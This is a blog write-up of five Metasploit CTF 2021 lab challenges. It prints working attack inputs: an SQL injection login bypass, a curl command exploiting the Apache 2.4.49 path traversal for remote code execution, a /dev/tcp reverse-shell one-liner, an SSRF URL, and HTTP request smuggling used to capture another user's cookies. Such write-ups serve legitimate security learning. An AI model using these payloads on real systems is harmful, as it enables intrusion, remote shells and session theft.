<!doctype html><html lang=en><head><title>Metasploit CTF 2021 WriteUp :: ikuamike</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/metasploit_ctf_2021/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-202973704-2','auto'),ga('send','pageview'))</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-202973704-2','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ascii.png"><meta name=twitter:title content="Metasploit CTF 2021 WriteUp"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/assets/style.css><link rel=stylesheet href=https://blog.ikuamike.io/assets/green.css><link rel=stylesheet href=https://blog.ikuamike.io/style.css><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://blog.ikuamike.io/img/favicon/green.png><meta name=twitter:card content="summary_large_image"><meta name=twitter:creator content="@ikuamike"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Metasploit CTF 2021 WriteUp"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/metasploit_ctf_2021/"><meta property="og:site_name" content="ikuamike"><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-12-06 00:00:00 +0000 UTC"></head><body class=green><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Show more ▾</li><ul class="menu__sub-inner-more hidden"><li><a href=/webinars>Webinars</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/webinars>Webinars</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/metasploit_ctf_2021/>Metasploit CTF 2021 WriteUp</a></h1><div class=post-meta><span class=post-date>2021-12-06</span></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/ctf/>CTF</a>&nbsp;</span><div class=table-of-contents><h2>Table of Contents</h2><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#challenges>Challenges</a><ul><li><a href=#5-of-diamonds>5 of Diamonds</a></li><li><a href=#10-of-clubs>10 of Clubs</a></li><li><a href=#2-of-clubs>2 of Clubs</a></li><li><a href=#ace-of-hearts>Ace of Hearts</a></li><li><a href=#3-of-hearts>3 of Hearts</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div><div class=post-content><div><img src=/img/metasploitctf2021/metasploit-ascii.png class=center style=border-radius:8px><h2 id=introduction>Introduction<a href=#introduction class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Similar to last year&rsquo;s ctf we are provided with a kali machine as the jump box and an Ubuntu VM with ports open for the different challenges.</p><p>As usual I participated with team @<a href=https://twitter.com/fr334aks target=_blank rel=noopener>fr334aks</a>
and we were able to solve 8 challenges and got position 47/265. This year
most of the challenges were tougher than last year as we solved less. It was a good experience nonetheless. You can read last year&rsquo;s writeup <a href=https://blog.ikuamike.io/posts/2020/metasploitctf2020/ target=_blank rel=noopener>here</a>
if interested.</p><p>In this writeup I&rsquo;ll be explaining solutions of 5 challenges I was able to solve. To connect to the victim machine directly via the kali box, I used this sshuttle command.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>sshuttle -r kali@54.89.123.4 -e <span style=color:#e6db74>&#34;ssh -i metasploit_ctf_kali_ssh_key.pem&#34;</span> 172.17.6.181/32
</code></pre></div><h2 id=challenges>Challenges<a href=#challenges class=hanchor arialabel=Anchor>&#8983;</a></h2><h3 id=5-of-diamonds>5 of Diamonds<a href=#5-of-diamonds class=hanchor arialabel=Anchor>&#8983;</a></h3><p>This challenge was on port 11111. When we load it on our browser we get the below app.</p><img src=/img/metasploitctf2021/metasploit-ctf-20.png class=center style=border-radius:8px><p>For this one it was a simple sql injection login bypass. By supplying the username <code>admin</code> and the password <code>a' or 1=1-- -</code>
we can login and get the flag.</p><img src=/img/metasploitctf2021/metasploit-ctf-21.png class=center style=border-radius:8px><p><strong>Flag:</strong></p><img src=/img/metasploitctf2021/5ofdiamonds.png class=center style=border-radius:8px><h3 id=10-of-clubs>10 of Clubs<a href=#10-of-clubs class=hanchor arialabel=Anchor>&#8983;</a></h3><p>This challenge was on port 12380. From an nmap scan we get the below output.</p><img src=/img/metasploitctf2021/metasploit-ctf-1.png class=center style=border-radius:8px><p>When we access the http server on the browser we just get a static page.</p><img src=/img/metasploitctf2021/metasploit-ctf-2.png class=center style=border-radius:8px><p>The site didn&rsquo;t have anything interesting about it. Looking at the Apache httpd version it looked familiar as I had seen some
advisories floating around for this version regarding a directory traveral vulnerability that could lead to RCE.</p><p>Using the below PoC command I was able to confirm RCE.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl --data <span style=color:#e6db74>&#34;echo;id&#34;</span> <span style=color:#e6db74>&#39;http://172.17.6.181:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</span>
</code></pre></div><img src=/img/metasploitctf2021/metasploit-ctf-3.png class=center style=border-radius:8px><p>Then with the below command we can get a reverse shell on the kali vm.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl --data <span style=color:#e6db74>&#34;echo;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/172.17.6.180/53 0&gt;&amp;1&#39;&#34;</span> <span style=color:#e6db74>&#39;http://172.17.6.181:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#39;</span>
</code></pre></div><img src=/img/metasploitctf2021/metasploit-ctf-4.png class=center style=border-radius:8px><p>With the reverse shell we can get the md5sum of the image to submit as our flag.</p><img src=/img/metasploitctf2021/metasploit-ctf-5.png class=center style=border-radius:8px><p><strong>Flag:</strong></p><img src=/img/metasploitctf2021/10ofclubs.png class=center style=border-radius:8px><p><strong>Reference:</strong></p><p><code>https://isc.sans.edu/forums/diary/Apache+2449+Directory+Traversal+Vulnerability+CVE202141773/27908/</code></p><h3 id=2-of-clubs>2 of Clubs<a href=#2-of-clubs class=hanchor arialabel=Anchor>&#8983;</a></h3><p>This challenge was on port 20000 and 20001. When we visit port 20000 on our browser, we get the following:</p><img src=/img/metasploitctf2021/metasploit-ctf-6.png class=center style=border-radius:8px><p>The <code>/client</code> directory just has a file for us to download.</p><img src=/img/metasploitctf2021/metasploit-ctf-7.png class=center style=border-radius:8px><p>After extraction we get some files and <strong>clicktracer</strong> application that launches a GUI application.</p><img src=/img/metasploitctf2021/metasploit-ctf-8.png class=center style=border-radius:8px><p>Since it&rsquo;s connecting to localhost, I decided to use ssh port forwarding to forward the traffic to the victim.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>ssh -L 20001:172.17.6.181:20001 -i metasploit_ctf_kali_ssh_key.pem kali@54.89.123.4
</code></pre></div><p>Selecting the easy challenge, it appears to be a clicking game where we are supposed to click the red dots.</p><img src=/img/metasploitctf2021/metasploit-ctf-9.png class=center style=border-radius:8px><p>When the time hits 30 seconds, we get our final score.</p><img src=/img/metasploitctf2021/metasploit-ctf-10.png class=center style=border-radius:8px><p>Next step is to use wireshark and sniff the traffic to figure out the messages between the application and the server so as to automate the clicks and
get all of them.</p><img src=/img/metasploitctf2021/metasploit-ctf-11.png class=center style=border-radius:8px><p>When we click on the Easy Practice button the messages are as follows.</p><img src=/img/metasploitctf2021/metasploit-ctf-12.png class=center style=border-radius:8px><p>When we click on the Easy Challenge button the messages are as follows.</p><img src=/img/metasploitctf2021/metasploit-ctf-13.png class=center style=border-radius:8px><p>With this information I was able to automate all clicks for the challenge using the below script and get the flag.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#f92672>import</span> json
<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span>
port <span style=color:#f92672>=</span> <span style=color:#ae81ff>20001</span>
io <span style=color:#f92672>=</span> remote(host,port)
init <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;{&#34;StartGame&#34;:{&#34;game_mode&#34;:&#34;Easy&#34;}}&#39;</span>
io<span style=color:#f92672>.</span>sendline(init<span style=color:#f92672>.</span>encode())

<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>100</span>):
    resp <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>recv()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;TargetHit&#34;</span> <span style=color:#f92672>in</span> resp:
        <span style=color:#66d9ef>print</span>(resp)
        <span style=color:#66d9ef>continue</span>
    <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#34;GameEnded&#34;</span> <span style=color:#f92672>in</span> resp:
        <span style=color:#66d9ef>print</span>(resp)
        exit()
    <span style=color:#66d9ef>print</span>(resp)
    j <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(resp)
    x <span style=color:#f92672>=</span> j[<span style=color:#e6db74>&#34;TargetCreated&#34;</span>][<span style=color:#e6db74>&#34;x&#34;</span>]
    y <span style=color:#f92672>=</span> j[<span style=color:#e6db74>&#34;TargetCreated&#34;</span>][<span style=color:#e6db74>&#34;y&#34;</span>]
    click <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;{&#34;ClientClick&#34;:{&#34;x&#34;:&#39;</span><span style=color:#f92672>+</span> str(x) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;,&#34;y&#34;:&#39;</span> <span style=color:#f92672>+</span> str(y) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;}}&#39;</span>
    io<span style=color:#f92672>.</span>sendline(click<span style=color:#f92672>.</span>encode())
</code></pre></div><p>When the script runs to completion we get the location of the flag.</p><img src=/img/metasploitctf2021/metasploit-ctf-14.png class=center style=border-radius:8px><p><strong>Flag:</strong></p><img src=/img/metasploitctf2021/2ofclubs.png class=center style=border-radius:8px><h3 id=ace-of-hearts>Ace of Hearts<a href=#ace-of-hearts class=hanchor arialabel=Anchor>&#8983;</a></h3><p>This challenge was on port 20011. When we load it on the browser we get this app.</p><img src=/img/metasploitctf2021/metasploit-ctf-15.png class=center style=border-radius:8px><p>When we try to access each of the provided we can load them except for John which is restricted.</p><img src=/img/metasploitctf2021/metasploit-ctf-16.png class=center style=border-radius:8px><p>The other interesting feature is the form. When I submit a test input the application tries to load it as url.</p><img src=/img/metasploitctf2021/metasploit-ctf-17.png class=center style=border-radius:8px><p>Since we have an admin url that is also restricted, we can try to load it but specify the host as localhost as the below url.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>http://172.17.6.181:20011/gallery?galleryUrl<span style=color:#f92672>=</span>http://127.0.0.1:20011/admin
</code></pre></div><img src=/img/metasploitctf2021/metasploit-ctf-18.png class=center style=border-radius:8px><p>From this we can see that John&rsquo;s gallery is set to private. We can uncheck this and then access John&rsquo;s gallery.</p><img src=/img/metasploitctf2021/metasploit-ctf-19.png class=center style=border-radius:8px><p><strong>Flag:</strong></p><img src=/img/metasploitctf2021/aceofhearts.png class=center style=border-radius:8px><h3 id=3-of-hearts>3 of Hearts<a href=#3-of-hearts class=hanchor arialabel=Anchor>&#8983;</a></h3><p>This challenge was on port 33337. From nmap we get the following output.</p><img src=/img/metasploitctf2021/metasploit-ctf-22.png class=center style=border-radius:8px><p>When we try to load it on the browser it redirects to the domain threeofhearts.ctf.net. To sort this out I decided to add a match and replace
rule in burpsuite as below that sets the correct host header.</p><img src=/img/metasploitctf2021/metasploit-ctf-23.png class=center style=border-radius:8px><p>Now we can access the application.</p><img src=/img/metasploitctf2021/metasploit-ctf-24.png class=center style=border-radius:8px><p>The private page just shows access denied.</p><img src=/img/metasploitctf2021/metasploit-ctf-25.png class=center style=border-radius:8px><p>The logs page is empty but once we submit anything on the form, for example <code>a,a</code> it gets saved to save.txt together with 2 headers.</p><img src=/img/metasploitctf2021/metasploit-ctf-26.png class=center style=border-radius:8px><p>If we look at our burp history we see that the page responds with Nginx Save Page.</p><img src=/img/metasploitctf2021/metasploit-ctf-28.png class=center style=border-radius:8px><p>This means that the backend server is Nginx and frontend is the ATS server.</p><p>After some research I discovered that Apache Traffic Server 7.1.1 is vulnerable to http request smuggling.</p><p>In this case the issue is CL.TE.</p><p>Explanation from <a href=https://portswigger.net/web-security/request-smuggling>https://portswigger.net/web-security/request-smuggling</a>.</p><blockquote><p>CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.</p></blockquote><p>By sending the below request in burp, the ATS server uses Content-Length header and forwards the full request to the backend
nginx server which uses Transfer-Encoding header.</p><p>Nginx will then split the request into 2 whereby it takes <code>G</code> as the beginning of the next request. The result of this is that
any follow up requests will fail because the added <code>G</code> will create an HTTP method that doesn&rsquo;t exist. Say the follow up request is a GET
request the resulting method will be GGET.</p><img src=/img/metasploitctf2021/metasploit-ctf-29.png class=center style=border-radius:8px><p>We can confirm this by sending the malformed request multiple times then try to access the site normally. We see that receive an
error from nginx which is as a result of the bad method.</p><img src=/img/metasploitctf2021/metasploit-ctf-30.png class=center style=border-radius:8px><p>We can use this vulnerability to get access to the private page.</p><p>By sending the below request, we combine any follow up requests from any other users into the second request. The foo header will
combine the first line of the next request and that will be ignored as it is not a valid header and then any subsequent headers will be
processed by the backend and the cookie header logged to save.txt.</p><img src=/img/metasploitctf2021/metasploit-ctf-31.png class=center style=border-radius:8px><p>After sending the request multiple times we get a new entry that was not from us in save.txt. We see cookies of another user who is accessing the private
page.</p><img src=/img/metasploitctf2021/metasploit-ctf-27.png class=center style=border-radius:8px><p>We can then use this cookies to load the private page and get the flag.</p><img src=/img/metasploitctf2021/metasploit-ctf-32.png class=center style=border-radius:8px><p><strong>Flag:</strong></p><img src=/img/metasploitctf2021/3ofhearts.png class=center style=border-radius:8px><p><strong>Reference:</strong></p><p><code>https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/</code></p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Some great new challenges this year and definitely more challenging. Looking forward to next year&rsquo;s CTF.</p><p>The last challenge definitely made me feel like I need to get back to Web Security Academy.</p><p>If you have any questions or feedback feel free to reach out</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=https://blog.ikuamike.io/posts/2021/hackfest-2021-ctf/><span class=button__text>SheHacksKE HackFest 2021 CTF WriteUp</span>
<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>© Michael Ikua</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://blog.ikuamike.io/assets/main.js></script><script src=https://blog.ikuamike.io/assets/prism.js></script></div><script src=https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js></script><script>addBackToTop({diameter:40,backgroundColor:'rgb(120, 226, 160)',textColor:'#1F222A',cornerOffset:30})</script></body></html>